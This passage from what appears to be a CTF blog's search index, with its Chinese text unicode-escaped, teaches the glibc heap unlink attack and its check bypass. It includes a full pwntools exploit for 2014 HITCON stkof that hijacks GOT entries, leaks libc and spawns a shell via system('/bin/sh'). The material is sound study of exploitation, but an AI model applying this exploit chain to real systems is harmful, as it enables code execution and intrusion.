\u6307\u9488\u4fee\u6539\u4e3a\u6307\u5b9a\u7684\u503c\u3002\u5219\u5f53\u6211\u4eec free(Q) \u65f6 glibc \u5224\u65ad\u8fd9\u4e2a\u5757\u662f small chunk \u5224\u65ad\u524d\u5411\u5408\u5e76\uff0c\u53d1\u73b0\u524d\u4e00\u4e2a chunk \u5904\u4e8e\u4f7f\u7528\u72b6\u6001\uff0c\u4e0d\u9700\u8981\u524d\u5411\u5408\u5e76 \u5224\u65ad\u540e\u5411\u5408\u5e76\uff0c\u53d1\u73b0\u540e\u4e00\u4e2a chunk \u5904\u4e8e\u7a7a\u95f2\u72b6\u6001\uff0c\u9700\u8981\u5408\u5e76 \u7ee7\u800c\u5bf9 Nextchunk \u91c7\u53d6 unlink \u64cd\u4f5c \u90a3\u4e48 unlink \u5177\u4f53\u6267\u884c\u7684\u6548\u679c\u662f\u4ec0\u4e48\u6837\u5b50\u5462\uff1f\u6211\u4eec\u53ef\u4ee5\u6765\u5206\u6790\u4e00\u4e0b FD=P->fd = target addr -12 BK=P->bk = expect value FD->bk = BK\uff0c\u5373 *(target addr-12+12)=BK=expect value BK->fd = FD\uff0c\u5373 *(expect value +8) = FD = target addr-12 \u603b\u7ed3\uff1a // \u4f7f\u7528\u524d\u63d0\uff1a\u4f7f\u7528\u4f20\u5165\u53c2\u6570 P -> fd = target -12 ; P -> bk = expect value ; // \u4f5c\u7528\u6548\u679c\uff1a // target addr \u8986\u5199\u4e3a expect value * ( target addr ) = expect value ; // expect value \u8986\u5199\u4e3a target addr -12 * ( expect value + 8 ) = target addr -12 ; \u770b\u8d77\u6765\u6211\u4eec\u4f3c\u4e4e\u53ef\u4ee5\u901a\u8fc7 unlink \u76f4\u63a5\u5b9e\u73b0\u4efb\u610f\u5730\u5740\u8bfb\u5199\u7684\u76ee\u7684\uff0c\u4f46\u662f\u6211\u4eec\u8fd8\u662f\u9700\u8981\u786e\u4fdd expect value +8 \u5730\u5740\u5177\u6709\u53ef\u5199\u7684\u6743\u9650\u3002 \u6bd4\u5982\u8bf4\u6211\u4eec\u5c06 target addr \u8bbe\u7f6e\u4e3a\u67d0\u4e2a got \u8868\u9879\uff0c\u90a3\u4e48\u5f53\u7a0b\u5e8f\u8c03\u7528\u5bf9\u5e94\u7684 libc \u51fd\u6570\u65f6\uff0c\u5c31\u4f1a\u76f4\u63a5\u6267\u884c\u6211\u4eec\u8bbe\u7f6e\u7684\u503c\uff08expect value\uff09\u5904\u7684\u4ee3\u7801\u3002 \u9700\u8981\u6ce8\u610f\u7684\u662f\uff0cexpect value+8 \u5904\u7684\u503c\u88ab\u7834\u574f\u4e86\uff0c\u9700\u8981\u60f3\u529e\u6cd5\u7ed5\u8fc7\u3002","title":"\u53e4\u8001\u7684 unlink"},{"location":"Pwn/glibc-heap/unlink/#unlink_2","text":"**\u4f46\u662f\uff0c\u73b0\u5b9e\u662f\u6b8b\u9177\u7684\u3002\u3002**\u6211\u4eec\u521a\u624d\u8003\u8651\u7684\u662f\u6ca1\u6709\u68c0\u67e5\u7684\u60c5\u51b5\uff0c\u4f46\u662f\u4e00\u65e6\u52a0\u4e0a\u68c0\u67e5\uff0c\u5c31\u6ca1\u6709\u8fd9\u4e48\u7b80\u5355\u4e86\u3002\u6211\u4eec\u770b\u4e00\u4e0b\u5bf9 fd \u548c bk \u7684\u68c0\u67e5 // fd bk // FD\u7684\u4e0b\u4e00\u4e2achunk\u662f\u5426\u4e3aP\uff1bBK\u7684\u4e0a\u4e00\u4e2achunk\u662f\u5426\u4e3aP\uff1b if ( __builtin_expect ( FD -> bk != P || BK -> fd != P , 0 )) \\ malloc_printerr ( check_action , \"corrupted double-linked list\" , P , AV ); \\ \u5047\u5982\u6b64\u65f6 FD\u3001BK \u6307\u9488\u5185\u5bb9\u4e3a\uff1a FD->bk = target addr - 12 + 12=target_addr BK->fd = expect value + 8 \u90a3\u4e48\u6211\u4eec\u4e0a\u9762\u6240\u5229\u7528\u7684\u4fee\u6539 GOT \u8868\u9879\u7684\u65b9\u6cd5\u5c31 ~\u53ef\u80fd ~\u4e0d\u53ef\u7528\u4e86\uff0c\u4f46\u662f\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u4f2a\u9020\u7684\u65b9\u5f0f\u7ed5\u8fc7\u8fd9\u4e2a\u673a\u5236\u3002 \u9996\u5148\u6211\u4eec\u901a\u8fc7\u8986\u76d6\uff0c\u5c06 nextchunk \u7684 FD \u6307\u9488\u6307\u5411\u4e86 fakeFD\uff0c\u5c06 nextchunk \u7684 BK \u6307\u9488\u6307\u5411\u4e86 fakeBK \u3002\u90a3\u4e48\u4e3a\u4e86\u901a\u8fc7\u9a8c\u8bc1\uff0c\u6211\u4eec\u9700\u8981 fakeFD -> bk == P <=> *(fakeFD + 12) == P \u524d\u4e00\u4e2a chunk bk \u6307\u5411 P fakeBK -> fd == P <=> *(fakeBK + 8) == P \u540e\u4e00\u4e2a chunk fd \u6307\u5411 P \u5f53\u6ee1\u8db3\u4e0a\u8ff0\u4e24\u5f0f\u65f6\uff0c\u53ef\u4ee5\u8fdb\u5165 Unlink \u7684\u73af\u8282\uff0c\u8fdb\u884c\u5982\u4e0b\u64cd\u4f5c\uff1a fakeFD -> bk = fakeBK <=> *(fakeFD + 12) = fakeBK \u524d\u4e00\u4e2a chunk bk \u66f4\u65b0\u4e3a\u540e\u4e00\u4e2a chunk \u5730\u5740 fakeBK -> fd = fakeFD <=> *(fakeBK + 8) = fakeFD \u540e\u4e00\u4e2a chunk fd \u66f4\u65b0\u4e3a\u524d\u4e00\u4e2a chunk \u5730\u5740 \u5c0f\u7ed3 // \u89c4\u907f\u68c0\u67e5\u4f2a\u9020\u6761\u4ef6 // fakeFD == P->fd; fakeBK == P->bk; * ( fakeFD + 12 ) == P ; * ( fakeBK + 8 ) == P ; // unlink \u7ed3\u679c * ( fakeFD + 12 ) = fakeBK ; * ( fakeBK + 8 ) = fakeFD ; \u5982\u679c\u8ba9 fakeFD + 12 \u548c fakeBK + 8 \u6307\u5411\u540c\u4e00\u4e2a\u6307\u5411 P \u7684\u6307\u9488\uff0c\u90a3\u4e48\uff1a // fakeFD + 12 = P; fakeBK + 8 = P; * ( fakeFD + 12 ) = * P = fakeBK = P - 8 ; * ( fakeBK + 8 ) = * P = fakeFD = P - 12 ; \u5316\u7b80\u540e unlink \u7ed3\u679c\u4e3a\uff1a *P = P - 8 *P = P - 12 \u5373\u901a\u8fc7\u6b64\u65b9\u5f0f\uff0c P \u7684\u6307\u9488\u6307\u5411\u4e86\u6bd4\u81ea\u5df1\u4f4e 12 \u7684\u5730\u5740\u5904 \u3002\u6b64\u65b9\u6cd5\u867d\u7136\u4e0d\u53ef\u4ee5\u5b9e\u73b0\u4efb\u610f\u5730\u5740\u5199\uff0c\u4f46\u662f\u53ef\u4ee5\u4fee\u6539\u6307\u5411 chunk \u7684\u6307\u9488\uff0c\u8fd9\u6837\u7684\u4fee\u6539\u662f\u53ef\u4ee5\u8fbe\u5230\u4e00\u5b9a\u7684\u6548\u679c\u7684\u3002 \u8fd9\u91cc\u6307\u7684\u4f4e 12 \u662f\u5728 32 \u4f4d\u7cfb\u7edf\u4e0b\uff0c\u5982\u679c\u662f 64 \u4f4d\u7cfb\u7edf\u5c31\u662f 3*8 = 24 \u3002 \u5f52\u7eb3\u8d77\u6765\u5c31\u662f**\u5c06 P \u6307\u9488\u6307\u5411\u6bd4 P \u4f4e 3 \u4e2a\u673a\u5668\u5468\u671f\u7684\u5730\u5740\u5904** \u5982\u679c\u6211\u4eec\u60f3\u8981\u4f7f\u5f97\u4e24\u8005\u90fd\u6307\u5411 P\uff0c\u53ea\u9700\u8981\u6309\u7167\u5982\u4e0b\u65b9\u5f0f\u4fee\u6539\u5373\u53ef \u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u8fd9\u91cc\u6211\u4eec\u5e76\u6ca1\u6709\u8fdd\u80cc\u4e0b\u9762\u7684\u7ea6\u675f\uff0c\u56e0\u4e3a P \u5728 Unlink \u524d\u662f\u6307\u5411\u6b63\u786e\u7684 chunk \u7684\u6307\u9488\u3002 // \u7531\u4e8eP\u5df2\u7ecf\u5728\u53cc\u5411\u94fe\u8868\u4e2d\uff0c\u6240\u4ee5\u6709\u4e24\u4e2a\u5730\u65b9\u8bb0\u5f55\u5176\u5927\u5c0f\uff0c\u6240\u4ee5\u68c0\u67e5\u4e00\u4e0b\u5176\u5927\u5c0f\u662f\u5426\u4e00\u81f4\u3002 // \u5224\u65ad\u5f53\u524d\u5927\u5c0f chunksize \u4e0e nextchunk \u7684 prev_size \u8bb0\u5f55\u503c\u662f\u5426\u4e00\u81f4 if ( __builtin_expect ( chunksize ( P ) != prev_size ( next_chunk ( P )), 0 )) \\ malloc_printerr ( \"corrupted size vs. prev_size\" ); \\ \u6b64\u5916\uff0c\u5176\u5b9e\u5982\u679c\u6211\u4eec\u8bbe\u7f6e next chunk \u7684 fd \u548c bk \u5747\u4e3a nextchunk \u7684\u5730\u5740\u4e5f\u662f\u53ef\u4ee5\u7ed5\u8fc7\u4e0a\u9762\u7684\u68c0\u6d4b\u7684\u3002\u4f46\u662f\u8fd9\u6837\u7684\u8bdd\uff0c\u5e76\u4e0d\u80fd\u8fbe\u5230\u4fee\u6539\u6307\u9488\u5185\u5bb9\u7684\u6548\u679c\u3002","title":"\u5f53\u524d\u7684 unlink"},{"location":"Pwn/glibc-heap/unlink/#_2","text":"","title":"\u5229\u7528\u601d\u8def"},{"location":"Pwn/glibc-heap/unlink/#_3","text":"UAF \uff0c\u53ef\u4fee\u6539 free \u72b6\u6001\u4e0b smallbin \u6216\u662f unsorted bin \u7684 fd \u548c bk \u6307\u9488 \u5df2\u77e5\u4f4d\u7f6e\u5b58\u5728\u4e00\u4e2a\u6307\u9488\u6307\u5411\u53ef\u8fdb\u884c UAF \u7684 chunk","title":"\u6761\u4ef6"},{"location":"Pwn/glibc-heap/unlink/#_4","text":"\u4f7f\u5f97\u5df2\u6307\u5411 UAF chunk \u7684\u6307\u9488 ptr \u53d8\u4e3a ptr - 0x18","title":"\u6548\u679c"},{"location":"Pwn/glibc-heap/unlink/#_5","text":"\u8bbe\u6307\u5411\u53ef UAF chunk \u7684\u6307\u9488\u7684\u5730\u5740\u4e3a ptr \u4fee\u6539 fd \u4e3a ptr - 0x18 \u4fee\u6539 bk \u4e3a ptr - 0x10 \u89e6\u53d1 unlink ptr \u5904\u7684\u6307\u9488\u4f1a\u53d8\u4e3a ptr - 0x18\u3002","title":"\u601d\u8def"},{"location":"Pwn/glibc-heap/unlink/#2014-hitcon-stkof","text":"\u505a\u9898\u73af\u5883\uff1aUbuntu 16.04","title":"2014 HITCON stkof"},{"location":"Pwn/glibc-heap/unlink/#_6","text":"Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) stkof: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked \u7a0b\u5e8f\u5b58\u5728 4 \u4e2a\u529f\u80fd\uff0c\u7ecf\u8fc7 IDA \u5206\u6790\u540e\u53ef\u4ee5\u5206\u6790\u529f\u80fd\u5982\u4e0b alloc\uff1a\u8f93\u5165 size\uff0c\u5206\u914d size \u5927\u5c0f\u7684\u5185\u5b58\uff0c\u5e76\u5728 bss \u6bb5\u8bb0\u5f55\u5bf9\u5e94 chunk \u7684\u6307\u9488\uff0c\u5047\u8bbe\u5176\u4e3a global fill\uff1a\u6839\u636e\u6307\u5b9a\u7d22\u5f15\uff0c\u5411\u5206\u914d\u7684\u5185\u5b58\u5904\u8bfb\u5165\u6570\u636e\uff0c\u6570\u636e\u957f\u5ea6\u53ef\u63a7\uff0c \u8fd9\u91cc\u5b58\u5728\u5806\u6ea2\u51fa\u7684\u60c5\u51b5 free_chunk\uff1a\u6839\u636e\u6307\u5b9a\u7d22\u5f15\uff0c\u91ca\u653e\u5df2\u7ecf\u5206\u914d\u7684\u5185\u5b58\u5757 print\uff1a\u8fd9\u4e2a\u529f\u80fd\u5e76\u6ca1\u6709\u4ec0\u4e48\u5375\u7528\uff0c\u672c\u6765\u4ee5\u4e3a\u662f\u53ef\u4ee5\u8f93\u51fa\u5185\u5bb9\uff0c\u7ed3\u679c\u4ec0\u4e48\u4e5f\u6ca1\u6709\u8f93\u51fa","title":"\u57fa\u672c\u4fe1\u606f"},{"location":"Pwn/glibc-heap/unlink/#_7","text":"fiil \u5199\u5165\u5b57\u7b26\u957f\u5ea6\u662f\u7531\u7528\u6237\u51b3\u5b9a\u7684\uff0c\u8fd9\u91cc\u5c31\u5b58\u5728\u4e00\u4e2a\u5806\u6ea2\u51fa\u3002 idx = atol ( & s ); if ( idx > 0x100000 ) return 0xFFFFFFFFLL ; if ( ! globals [ idx ] ) return 0xFFFFFFFFLL ; fgets ( & s , 16 , stdin ); size = atoll ( & s ); ptr = globals [ idx ];","title":"\u6f0f\u6d1e\u51fd\u6570"},{"location":"Pwn/glibc-heap/unlink/#io","text":"\u8fd9\u6761\u9898\u76ee\u5806\u7a7a\u95f4\u4e00\u5f00\u59cb\u53ef\u80fd\u548c\u6211\u4eec\u60f3\u8c61\u7684\u4e0d\u4e00\u6837\uff0c\u8fd9\u662f\u7531\u4e8e\u7a0b\u5e8f\u672c\u8eab\u6ca1\u6709\u8fdb\u884c setbuf \u64cd\u4f5c\uff0c\u6240\u4ee5\u5728\u6267\u884c\u8f93\u5165\u8f93\u51fa\u64cd\u4f5c\u7684\u65f6\u5019\u4f1a\u7533\u8bf7\u7f13\u51b2\u533a\u3002\u8fd9\u91cc\u7ecf\u8fc7\u6d4b\u8bd5\uff0c\u4f1a\u7533\u8bf7\u4e24\u4e2a\u7f13\u51b2\u533a\uff0c\u5206\u522b\u5927\u5c0f\u4e3a 1024 \u548c 1024\u3002\u5177\u4f53\u5982\u4e0b\uff0c\u53ef\u4ee5\u8fdb\u884c\u8c03\u8bd5\u67e5\u770b\u3002 \u521d\u6b21\u8c03\u7528 fgets \u65f6\uff0cmalloc \u4f1a\u5206\u914d\u7f13\u51b2\u533a 1024 \u5927\u5c0f\u3002 *RAX 0x0 *RBX 0x400 *RCX 0x7ffff7b03c34 (__fxstat64+20) \u25c2\u2014 cmp rax, -0x1000 /* 'H=' */ *RDX 0x88 *RDI 0x400 *RSI 0x7fffffffd860 \u25c2\u2014 0x16 *R8 0x1 *R9 0x0 *R10 0x7ffff7fd2700 \u25c2\u2014 0x7ffff7fd2700 *R11 0x246 *R12 0xa *R13 0x9 R14 0x0 *R15 0x7ffff7dd18e0 (_IO_2_1_stdin_) \u25c2\u2014 0xfbad2288 *RBP 0x7ffff7dd18e0 (_IO_2_1_stdin_) \u25c2\u2014 0xfbad2288 *RSP 0x7fffffffd858 \u2014\u25b8 0x7ffff7a7a1d5 (_IO_file_doallocate+85) \u25c2\u2014 mov rsi, rax *RIP 0x7ffff7a91130 (malloc) \u25c2\u2014 push rbp \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ DISASM ]\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 \u25ba 0x7ffff7a91130 <malloc> push rbp <0x7ffff7dd18e0> ...\uff0c\u7701\u7565 \u25ba f 0 7ffff7a91130 malloc f 1 7ffff7a7a1d5 _IO_file_doallocate+85 f 2 7ffff7a88594 _IO_doallocbuf+52 f 3 7ffff7a8769c _IO_file_underflow+508 f 4 7ffff7a8860e _IO_default_uflow+14 f 5 7ffff7a7bc6a _IO_getline_info+170 f 6 7ffff7a7bd78 f 7 7ffff7a7ab7d fgets+173 f 8 400d2e f 9 7ffff7a2d830 __libc_start_main+240 \u5206\u914d\u4e4b\u540e\uff0c\u5806\u5982\u4e0b pwndbg> heap Top Chunk: 0xe05410 Last Remainder: 0 0xe05000 PREV_INUSE { prev_size = 0, size = 1041, fd = 0x0, bk = 0x0, fd_nextsize = 0x0, bk_nextsize = 0x0 } 0xe05410 PREV_INUSE { prev_size = 0, size = 134129, fd = 0x0, bk = 0x0, fd_nextsize = 0x0, bk_nextsize = 0x0 } \u5f53\u5206\u914d16\u5927\u5c0f\u7684\u5185\u5b58\u540e\uff0c\u5806\u5e03\u5c40\u5982\u4e0b pwndbg> heap Top Chunk: 0xe05430 Last Remainder: 0 0xe05000 PREV_INUSE { prev_size = 0, size = 1041, fd = 0xa3631, bk = 0x0, fd_nextsize = 0x0, bk_nextsize = 0x0 } 0xe05410 FASTBIN { prev_size = 0, size = 33, fd = 0x0, bk = 0x0, fd_nextsize = 0x0, bk_nextsize = 0x20bd1 } 0xe05430 PREV_INUSE { prev_size = 0, size = 134097, fd = 0x0, bk = 0x0, fd_nextsize = 0x0, bk_nextsize = 0x0 } \u5f53\u4f7f\u7528 printf \u51fd\u6570\uff0c\u4f1a\u5206\u914d 1024 \u5b57\u8282\u7a7a\u95f4\uff0c\u5982\u4e0b *RAX 0x0 *RBX 0x400 *RCX 0x7ffff7b03c34 (__fxstat64+20) \u25c2\u2014 cmp rax, -0x1000 /* 'H=' */ *RDX 0x88 *RDI 0x400 *RSI 0x7fffffffd1c0 \u25c2\u2014 0x16 R8 0x0 *R9 0x0 *R10 0x0 *R11 0x246 *R12 0x1 *R13 0x7fffffffd827 \u25c2\u2014 0x31 /* '1' */ R14 0x0 *R15 0x400de4 \u25c2\u2014 and eax, 0x2e000a64 /* '%d\\n' */ *RBP 0x7ffff7dd2620 (_IO_2_1_stdout_) \u25c2\u2014 0xfbad2284 *RSP 0x7fffffffd1b8 \u2014\u25b8 0x7ffff7a7a1d5 (_IO_file_doallocate+85) \u25c2\u2014 mov rsi, rax *RIP 0x7ffff7a91130 (malloc) \u25c2\u2014 push rbp \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ DISASM ]\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 \u25ba 0x7ffff7a91130 <malloc> push rbp <0x7ffff7dd2620> \u3002\u3002\u3002\u7701\u7565 \u25ba f 0 7ffff7a91130 malloc f 1 7ffff7a7a1d5 _IO_file_doallocate+85 f 2 7ffff7a88594 _IO_doallocbuf+52 f 3 7ffff7a878f8 _IO_file_overflow+456 f 4 7ffff7a8628d _IO_file_xsputn+173 f 5 7ffff7a5ae00 vfprintf+3216 f 6 7ffff7a62899 printf+153 f 7 4009cd f 8 400cb1 f 9 7ffff7a2d830 __libc_start_main+240 \u5806\u5e03\u5c40\u5982\u4e0b pwndbg> heap Top Chunk: 0xe05840 Last Remainder: 0 0xe05000 PREV_INUSE { prev_size = 0, size = 1041, fd = 0xa3631, bk = 0x0, fd_nextsize = 0x0, bk_nextsize = 0x0 } 0xe05410 FASTBIN { prev_size = 0, size = 33, fd = 0x0, bk = 0x0, fd_nextsize = 0x0, bk_nextsize = 0x411 } 0xe05430 PREV_INUSE { prev_size = 0, size = 1041, fd = 0xa4b4f, bk = 0x0, fd_nextsize = 0x0, bk_nextsize = 0x0 } 0xe05840 PREV_INUSE { prev_size = 0, size = 133057, fd = 0x0, bk = 0x0, fd_nextsize = 0x0, bk_nextsize = 0x0 } \u6b64\u540e\uff0c\u65e0\u8bba\u662f\u8f93\u5165\u8f93\u51fa\u90fd\u4e0d\u4f1a\u518d\u7533\u8bf7\u7f13\u51b2\u533a\u4e86\u3002\u6240\u4ee5\u6211\u4eec\u6700\u597d\u6700\u521d\u7684\u7533\u8bf7\u4e00\u4e2a chunk \u6765\u628a\u8fd9\u4e9b\u7f13\u51b2\u533a\u7ed9\u7533\u8bf7\u4e86\uff0c\u65b9\u4fbf\u4e4b\u540e\u64cd\u4f5c\u3002 \u4f46\u662f\uff0c\u6bd4\u8f83\u6709\u610f\u601d\u7684\u662f\uff0c\u5982\u679c\u6211\u4eec\u662f gdb.attach \u4e0a\u53bb\u7684\u8bdd\uff0c\u7b2c\u4e00\u4e2a\u7f13\u51b2\u533a\u5206\u914d\u7684\u5927\u5c0f\u4e3a 4096 \u5927\u5c0f\u3002 pwndbg> heap Top Chunk: 0x1e9b010 Last Remainder: 0 0x1e9a000 PREV_INUSE { prev_size = 0, size = 4113, fd = 0x0, bk = 0x0, fd_nextsize = 0x0, bk_nextsize = 0x0 } 0x1e9b010 PREV_INUSE { prev_size = 0, size = 135153, fd = 0x0, bk = 0x0, fd_nextsize = 0x0, bk_nextsize = 0x0 } \u7533\u8bf7\u7b2c\u4e00\u4e2a\u5806\uff080x48\uff09\uff0c\u4e4b\u540e\u8fd8\u4f1a\u51fa\u73b0\u7b2c\u4e8c\u4e2a\u7f13\u51b2\u533a\u5806\u5757\uff081040\uff09\uff1a //\u91cd\u65b0\u542f\u52a8\u8fc7\uff0c\u6240\u4ee5\u5730\u5740\u4e0e\u4e0a\u9762\u4e0d\u5bf9\u5e94\uff0c\u4f46\u662f\u7ed3\u6784\u662f\u4e00\u6837\u7684 pwndbg> heap 0xe05000 PREV_INUSE { prev_size = 0, size = 4113, fd = 0xa383231, bk = 0x0, fd_nextsize = 0x0, bk_nextsize = 0x0 } 0xe06010 FASTBIN { prev_size = 0, size = 81, fd = 0x0, bk = 0x0, fd_nextsize = 0x0, bk_nextsize = 0x0 } 0xe06060 PREV_INUSE { prev_size = 0, size = 1041, fd = 0xa4b4f, bk = 0x0, fd_nextsize = 0x0, bk_nextsize = 0x0 } \u2026\u2026\u2026\u2026","title":"IO \u7f13\u51b2\u533a\u95ee\u9898\u5206\u6790"},{"location":"Pwn/glibc-heap/unlink/#_8","text":"\u6839\u636e\u4e0a\u9762\u5206\u6790\uff0c\u6211\u4eec\u5728\u524d\u9762\u5148\u5206\u914d\u4e00\u4e2a chunk \u6765\u628a\u7f13\u51b2\u533a\u5206\u914d\u5b8c\u6bd5\uff0c\u4ee5\u514d\u5f71\u54cd\u4e4b\u540e\u7684\u64cd\u4f5c\u3002 \u7531\u4e8e\u7a0b\u5e8f\u672c\u8eab\u6ca1\u6709 leak\uff0c\u8981\u60f3\u6267\u884c system \u7b49\u51fd\u6570\uff0c\u6211\u4eec\u7684\u9996\u8981\u76ee\u7684\u8fd8\u662f\u5148\u6784\u9020 leak\uff0c\u57fa\u672c\u601d\u8def\u5982\u4e0b\uff1a \u5229\u7528 unlink \u4fee\u6539 global[2] \u4e3a &global[2]-0x18\u3002 \u5229\u7528\u7f16\u8f91\u529f\u80fd\u4fee\u6539 global[0] \u4e3a free@got \u5730\u5740\uff0c\u540c\u65f6\u4fee\u6539 global[1] \u4e3aputs@got \u5730\u5740\uff0cglobal[2] \u4e3a &global[2]-0x18 \u3002 \u4fee\u6539 free@got \u4e3a puts@plt \u7684\u5730\u5740\uff0c\u4ece\u800c\u5f53\u518d\u6b21\u8c03\u7528 free \u51fd\u6570\u65f6\uff0c\u5373\u53ef\u76f4\u63a5\u8c03\u7528 puts \u51fd\u6570\u3002\u8fd9\u6837\u5c31\u53ef\u4ee5\u6cc4\u6f0f\u51fd\u6570\u5185\u5bb9\u3002 free global[1]\uff0c\u5373\u6cc4\u6f0f puts@got \u5185\u5bb9\uff0c\u4ece\u800c\u77e5\u9053 system \u51fd\u6570\u5730\u5740\u4ee5\u53ca libc \u4e2d /bin/sh \u5730\u5740\u3002 \u4fee\u6539 global[1] \u4e3a /bin/sh \u5730\u5740\uff0c\u4fee\u6539 free@got \u4e3a system@got \u7684\u5730\u5740\uff0cfree chunk 1 \u5373\u53ef\u3002 unlink \u6211\u4eec\u641e\u4e24\u4e2a\u7269\u7406\u76f8\u90bb\u7684\u5806\u5373\u53ef\uff082&3\uff09\uff0c\u4e5f\u4e0d\u9700\u8981\u5173\u5fc3 chunk3 free \u65f6\u4f1a\u4e0e topchunk \u5408\u5e76\uff0c\u6240\u4ee5\u6ca1\u6709\u521b\u5efa\u4e00\u4e2a\u4fdd\u62a4\u5806\u5757\u3002 create ( 0x48 ) # 1 create ( 0x30 ) # 2 create ( 0x80 ) # 3 \u6700\u540e getshell \u505a\u6cd5\u548c wiki \u7565\u6709\u533a\u522b\u3002","title":"\u57fa\u672c\u601d\u8def"},{"location":"Pwn/glibc-heap/unlink/#exp","text":"#!/usr/bin/env python # -*- coding: utf-8 -*- # @Author : MrSkYe # @Email : skye231@foxmail.com from pwn import * context ( log_level = 'debug' , os = 'linux' , arch = 'amd64' ) p = process ( \"./stkof\" ) elf = ELF ( \"./stkof\" ) libc = ELF ( \"/lib/x86_64-linux-gnu/libc.so.6\" ) def create ( size ): p . sendline ( '1' ) p . sendline ( str ( size )) p . recvuntil ( 'OK \\n ' ) def edit ( idx , size , content ): p . sendline ( '2' ) p . sendline ( str ( idx )) p . sendline ( str ( size )) p . send ( content ) p . recvuntil ( 'OK \\n ' ) def free ( idx ): p . sendline ( '3' ) p . sendline ( str ( idx )) def show ( idx ): p . sendline ( '4' ) p . sendline ( str ( idx )) globals = 0x0602140 ptr = globals + 0x10 create ( 0x48 ) # 1 create ( 0x30 ) # 2 create ( 0x80 ) # 3 # \u4f2a\u9020\u4e00\u4e2a\u5806\u5757\uff1b\u4fee\u6539chunk3 size\uff1b payload0 = p64 ( 0 ) + p64 ( 0x20 ) payload0 += p64 ( ptr - 0x18 ) + p64 ( ptr - 0x10 ) payload0 += p64 ( 0x20 ) payload0 = payload0 . ljust ( 0x30 , 'a' ) payload0 += p64 ( 0x30 ) + p64 ( 0x90 ) edit ( 2 , len ( payload0 ), payload0 ) # \u89e6\u53d1unlink free ( 3 ) p . recvuntil ( 'OK \\n ' ) # \u4fee\u6539global\u6307\u9488\u8868 payload1 = \"skye\" . ljust ( 0x8 , 'a' ) payload1 += p64 ( elf . got [ 'free' ]) # 0 payload1 += p64 ( elf . got [ 'puts' ]) # 1 payload1 += p64 ( globals - 0x8 ) # 2 edit ( 2 , len ( payload1 ), payload1 ) # overwrite free 2 puts edit ( 0 , 8 , p64 ( elf . plt [ 'puts' ])) # leak libc free ( 1 ) puts_addr = u64 ( p . recvuntil ( ' \\n OK \\n ' , drop = True ) . ljust ( 8 , ' \\x00 ' )) log . info ( \"puts_addr:\" + hex ( puts_addr )) libc_base = puts_addr - libc . symbols [ 'puts' ] binsh_addr = libc_base + next ( libc . search ( '/bin/sh' )) system_addr = libc_base + libc . symbols [ 'system' ] log . success ( 'libc_base:' + hex ( libc_base )) log . success ( 'binsh_addr:' + hex ( binsh_addr )) log . success ( 'system_addr:' + hex ( system_addr )) # \u4fee\u6539global\u6307\u9488\u8868 payload2 = \"skye\" . ljust ( 0x8 , 'a' ) payload2 += p64 ( elf . got [ 'free' ]) # 0 payload2 += p64 ( binsh_addr ) # 1 edit ( 2 , len ( payload2 ), payload2 ) # overwrite free 2 system edit ( 0 , 8 , p64 ( system_addr )) # gdb.attach(p,'b *0x0400919') free ( 1 ) p . interactive ()","title":"EXP"},{"location":"Pwn/glibc-heap/unlink/#2016-zctf-note2","text":"","title":"2016 ZCTF note2"},{"location":"Pwn/glibc-heap/unlink/#_9","text":"Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) note2: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked","title":"\u57fa\u672c\u4fe1\u606f"},{"location":"Pwn/glibc-heap/unlink/#_10","text":"\u9996\u5148\uff0c\u6211\u4eec\u5148\u5206\u6790\u4e00\u4e0b\u7a0b\u5e8f\uff0c\u53ef\u4ee5\u770b\u51fa\u7a0b\u5e8f\u7684\u4e3b\u8981\u529f\u80fd\u4e3a \u6dfb\u52a0 note\uff0csize \u9650\u5236\u4e3a 0x80\uff0csize \u4f1a\u88ab\u8bb0\u5f55\uff0cnote \u6307\u9488\u4f1a\u88ab\u8bb0\u5f55\u3002 \u5c55\u793a note \u5185\u5bb9\u3002 \u7f16\u8f91 note \u5185\u5bb9\uff0c\u5176\u4e2d\u5305\u62ec\u8986\u76d6\u5df2\u6709\u7684 note\uff0c\u5728\u5df2\u6709\u7684 note \u540e\u9762\u6dfb\u52a0\u5185\u5bb9\u3002 \u91ca\u653e note\u3002 